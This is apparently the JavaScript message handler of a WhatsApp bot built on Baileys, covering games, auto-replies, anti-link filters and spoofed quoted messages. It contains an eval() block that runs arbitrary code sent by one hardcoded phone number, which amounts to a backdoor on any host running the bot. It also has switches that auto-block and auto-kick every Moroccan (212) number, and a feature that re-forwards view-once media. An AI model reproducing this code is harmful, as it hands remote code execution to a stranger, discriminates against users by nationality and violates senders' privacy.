require('./settings')
require('./lib/listmenu')
const { modul } = require('./module')
const ttt = require("google-tts-api");
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, maker } = modul
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, jidNormalizedUser, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const { color, bgcolor } = require('./lib/color')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const rose = process.env.APIKEY;
const { rentfromZero, conns } = require('./RentBot')
const { uptotelegra } = require('./scrape/upload')
const { msgFilter } = require('./lib/antispam')
const {TelegraPh} = require('./scrape/upload')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess') 
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const processing = require("@xct007/photo-enhance");
const { ZeroInstaMp4 } = require('./scrape/InstaMp4')
const { ZeroIgImg } = require('./scrape/IgImg')
const { ZeroFb } = require('./scrape/Fb')
const { ZeroTwitter } = require('./scrape/Twitter')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const textpro2 = require('./scrape/textpro2')
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search/dist/yt-search')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const Zeroverifieduser = JSON.parse(fs.readFileSync('./database/user.json'))
const VoiceNoteZero = JSON.parse(fs.readFileSync('./Media/database/Zerovn.json'))
const StickerZero = JSON.parse(fs.readFileSync('./Media/database/Zerosticker.json'))
const ImageZero = JSON.parse(fs.readFileSync('./Media/database/Zeroimage.json'))
const VideoZero = JSON.parse(fs.readFileSync('./Media/database/Zerovideo.json'))
const BadZero = JSON.parse(fs.readFileSync('./database/bad.json'))

let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))



global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}

// read database
let tebaklagu = db.game.tebaklagu = []
let kuismath = db.game.math = []
let vote = db.others.vote = []

module.exports = client = async (client, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "/" : prefa ?? global.prefixo
        const prefixo = '';
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefixo)
        const prefixe = "/"
        const isCmdd = body.startsWith(prefixe)
        const from = jidNormalizedUser(m.key.remoteJid || m.key.participant)
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefixo,'').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await client.decodeJid(client.user.id)
        const ZeroTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const ZeroTheDeveloper = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(m.sender)
    	const isUser = Zeroverifieduser.includes(sender)
    	const banUser = await client.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>')
    
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
        
        //theme sticker reply
        const ZeroStickWait = () => {
        let ZeroStikRep = fs.readFileSync('./Media/theme/sticker_reply/wait.webp')
        client.sendMessage(from, { sticker: ZeroStikRep }, { quoted: m })
        }
        const ZeroStickAdmin = () => {
        let ZeroStikRep = fs.readFileSync('./Media/theme/sticker_reply/admin.webp')
        client.sendMessage(from, { sticker: ZeroStikRep }, { quoted: m })
        }
        const ZeroStickBotAdmin = () => {
        let ZeroStikRep = fs.readFileSync('./Media/theme/sticker_reply/botadmin.webp')
        client.sendMessage(from, { sticker: ZeroStikRep }, { quoted: m })
        }
        const ZeroStickOwner = () => {
        let ZeroStikRep = fs.readFileSync('./Media/theme/sticker_reply/owner.webp')
        client.sendMessage(from, { sticker: ZeroStikRep }, { quoted: m })
        }
        const ZeroStickGroup = () => {
        let ZeroStikRep = fs.readFileSync('./Media/theme/sticker_reply/group.webp')
        client.sendMessage(from, { sticker: ZeroStikRep }, { quoted: m })
        }
        const ZeroStickPrivate = () => {
        let ZeroStikRep = fs.readFileSync('./Media/theme/sticker_reply/private.webp')
        client.sendMessage(from, { sticker: ZeroStikRep }, { quoted: m })
        }
                   
        //TIME
        const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var Zeroytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var Zeroytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var Zeroytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var Zeroytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var Zeroytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var Zeroytimewisher = `Good Morning 🌄`
 } 

		if (isEval && senderNumber == "917404854406") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					m.reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
				await client.sendMessage(from, { text: evaled }, { quoted: m })
			} catch (e) {
				client.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premium: false
}

const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
	    } else global.db.settings[botNumber] = {
    	    anticall: true,
    		status: 0,
    		autobio: false
	    }

} catch (err) {
console.error(err)
}

if (!client.public) {
if (!m.key.fromMe) return
}

//chat counter (console log)
        if (m.message && m.isGroup) {
            client.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            client.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

if (isCmd && !isUser) {
Zeroverifieduser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(Zeroverifieduser, null, 2))
}

client.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Don't Tag Him!
He's AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {

            kuis = true

            jawaban = kuismath[m.sender.split('@')[0]]

            if (budy.toLowerCase() == jawaban) {

                await m.reply(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefixo}math mode`)

                delete kuismath[m.sender.split('@')[0]]

            } else m.reply('*Wrong Answer!*')

        }


//TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room13 = Object.values(this.game).find(room13 => room13.id && room13.game && room13.state && room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender) && room13.state == 'PLAYING')
	    if (room13) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room13.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'Game Has Ended',
	    '-2': 'Invalid',
	    '-1': 'Invalid Position',
	    0: 'Invalid Position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room13.game.winner) isWin = true
	    else if (room13.game.board === 511) isTie = true
	    let arr = room13.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room13.game._currentTurn = m.sender === room13.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room13.game.currentTurn : room13.game.winner
	    let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
❌: @${room13.game.playerX.split('@')[0]}
⭕: @${room13.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
	    if ((room13.game._currentTurn ^ isSurrender ? room13.x : room13.o) !== m.chat)
	    room13[room13.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room13.x !== room13.o) await client.sendText(room13.x, str, m, { mentions: parseMention(str) } )
	    await client.sendText(room13.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room13.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    client.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    client.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) client.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) client.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) client.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    client.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) client.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) client.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    client.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

		// auto set bio
	if (db.settings[botNumber].autobio) {
	    let setting = global.db.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await client.updateProfileStatus(`${client.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}

//autoblock 212
if (global.autoblockmorroco) {
if (m.sender.startsWith('212')) return client.updateBlockStatus(m.sender, 'block')
}

//autokick 212
if (global.autokickmorroco) {
if (m.isGroup && m.sender.startsWith('212')) return client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}

//antispam kick
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {

console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))

return await client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}

}

async function sendZeroBotIncMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await client.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

//group chat msg by Zero
const replygcZero = (teks) => {
client.sendMessage(from,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./Media/theme/zero-bot.png`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})
}
const replygcZero2 = (teks) => {        
sendZeroBotIncMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
const reply = (teks) => {
client.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : m })
}

const sendSticker = (pesan) => {
client.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

const sendvn = (teks) => {
client.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

//autoreply
for (let lolzero of VoiceNoteZero) {
if (budy === lolzero) {
let audiobuffy = fs.readFileSync(`./Media/audio/${lolzero}.mp3`)
client.sendMessage(from, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let lolzero of StickerZero){
if (budy === lolzero){
let stickerbuffy = fs.readFileSync(`./Media/sticker/${lolzero}.webp`)
client.sendMessage(from, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let lolzero of ImageZero){
if (budy === lolzero){
let imagebuffy = fs.readFileSync(`./Media/image/${lolzero}.jpg`)
client.sendMessage(from, { image: imagebuffy }, { quoted: m })
}
}
for (let lolzero of VideoZero){
if (budy === lolzero){
let videobuffy = fs.readFileSync(`./Media/video/${lolzero}.mp4`)
client.sendMessage(from, { video: videobuffy }, { quoted: m })
}
}

if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${m.sender.split("@")[0]}\n├ *Clock* : ${time2}\n└ *Message* : ${m.mtype}`
client.sendMessage(from, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m}).catch(_ => m.reply(`Maybe It's Opened`))
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }

const banRep = () => {
client.sendMessage(from, {
text:`Sorry you've been banned, please chat @${creator.split("@")[0]} to unban`,
mentions: [creator],
},
{
quoted:m
})
}

//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=917404854406:917404854406\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./Media/theme/zero-bot.png'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

if (isCmdd && isBanned) {
return banRep()
}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await client.getName(i),
